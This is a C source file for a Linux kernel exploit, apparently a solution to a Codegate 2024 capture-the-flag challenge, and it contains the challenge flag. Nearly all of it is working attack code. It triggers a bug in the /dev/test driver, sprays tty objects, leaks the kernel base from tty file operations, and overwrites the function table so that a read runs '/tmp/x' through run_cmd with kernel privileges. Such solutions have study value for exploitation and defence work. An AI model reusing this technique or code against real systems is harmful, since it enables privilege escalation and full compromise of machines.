// gcc exploit.c -masm=intel -fno-PIE -nostdlib -no-pie -o exploit
// codegate2024{d4dc41e3e537cfadafcac5972701aa473a7feb8494964015d3253911106ab0a}
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

ssize_t read(int fd, void *buf, size_t count);
ssize_t write(int fd, const void *buf, size_t count);
int open(const char* pathname, int flags, ...);
int close(int fd);
void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
int mprotect(void *addr, size_t len, int prot);
int munmap(void *addr, size_t length);
int ioctl(int fd, unsigned long request, ...);
pid_t fork(void);
int execve(const char *filename, char *const argv[], char *const envp[]);
void exit(int status);

void *memset(void *s, int c, size_t n);
void *memcpy(void *dest, const void *src, size_t n);
size_t strlen(const char *s);
char *strcpy(char *dest, const char *src);
int puts(const char *s);
static void dump(void *buf, size_t size);

/* exploit */
#define __START_KERNEL_map	0xffffffff80000000
#define TEXT_BASE			0xffffffff81000000
#define OFFSET(addr)	((addr) - (TEXT_BASE))
#define ADDR(offset)	(kernel_base + (offset))
#define ADDR_IDT			0xfffffe0000000000

uintptr_t kernel_base = 0;
const uintptr_t ofs_tty_fops      		= OFFSET(0xffffffff82287660);
const uintptr_t ofs_run_cmd 			= OFFSET(0xffffffff810bcc20);

/*
static void show_map(void){
	int fd_map;
	if((fd_map = open("/proc/self/maps", O_RDONLY)) > 0){
		char buf_map[0x1000];
		read(fd_map, buf_map, sizeof(buf_map));
		puts(buf_map);
	}
	close(fd_map);
}
 */

void _start(void){
	int fd[2];

	if((fd[0] = open("/dev/test", O_RDWR)) < 0)
		exit(-1);
	if((fd[1] = open("/dev/test", O_RDWR)) < 0)
		exit(-1);

	void *p = mmap((void*)(1UL<<39), 0x3000, PROT_READ|PROT_WRITE, MAP_SHARED, fd[0], 0);
	mmap((void*)((1UL<<39)+(1UL<<30)), 0x3000, PROT_READ|PROT_WRITE, MAP_SHARED, fd[1], 0);
	write(fd[0], NULL, 0); // vuln

	int tty_fd;
	uintptr_t addr_evilpage;
	uint64_t *evil;

	for(int i=0; i<0x100; i++){
		tty_fd = open("/dev/tty", O_RDONLY);

		for(int j=0; j<3; j++){
			evil = ((uint64_t*)(p+0x1000*j));
			if(evil[2] == 0x0a000100000000){
				dump(evil, 0x100);
				uintptr_t tty_fops  = evil[22];
				kernel_base = tty_fops - ofs_tty_fops;

				addr_evilpage = evil[29] - 0x100;
				goto FOUND;
			}
		}
	}

	exit(-2);

FOUND:
	strcpy((void*)evil, "/tmp/x");
	evil[0x100+2] = ADDR(ofs_run_cmd);
	evil[22] = addr_evilpage + 0x100*8;
	read(tty_fd, NULL, 0);	// trigger

	exit(0);
}

/* utils */
void *memset(void *s, int c, size_t n){
	for(int i=0; i<n; i++)
		*(char*)(s+i) = (char)c;
	return s;
}

void *memcpy(void *dest, const void *src, size_t n){
	for(int i=0; i<n; i++)
		*(char*)(dest+i) = *(char*)(src+i);
	return dest;
}

size_t strlen(const char *s){
	uint64_t i;
	for(i=0; s[i]; i++);
	return i;
}

char *strcpy(char *dest, const char *src){
	memcpy(dest, src, strlen(src)+1);
	return dest;
}

int puts(const char *s){
	int n;

	n = write(1, (void*)s, strlen(s));
	write(1, "\n", 1);

	return n;
}

static void dump(void *buf, size_t size) {
	uint8_t *tb = buf;
	char sym[] = "0123456789abcdef";

	if (!tb)
		return;

	for (uint64_t i=0; i<size; i++) {
		write(1, &sym[(tb[i]&0xf0) >> 4], 1);
		write(1, &sym[(tb[i]&0x0f) >> 0], 1);
		write(1, " ", 1);
		if(i%8 == 7)
			write(1, " ", 1);
		if(i%64 == 63)
			write(1, "\n", 1);
	}
	write(1, "\n", 1);
}

asm(
"read:\n"
"mov rax, 0\n"
"syscall\n"
"ret\n"

"write:\n"
"mov rax, 1\n"
"syscall\n"
"ret\n"

"open:\n"
"mov rax, 2\n"
"syscall\n"
"ret\n"

"close:\n"
"mov rax, 3\n"
"syscall\n"
"ret\n"

"mmap:\n"
"mov rax, 9\n"
"mov r10, rcx\n"
"syscall\n"
"ret\n"

"mprotect:\n"
"mov rax, 10\n"
"syscall\n"
"ret\n"

"munmap:\n"
"mov rax, 11\n"
"syscall\n"
"ret\n"

"ioctl:\n"
"mov rax, 16\n"
"syscall\n"
"ret\n"

"fork:\n"
"mov rax, 57\n"
"syscall\n"
"ret\n"

"execve:\n"
"mov rax, 59\n"
"syscall\n"
"ret\n"

"exit:\n"
"mov rax, 60\n"
"syscall\n"
);

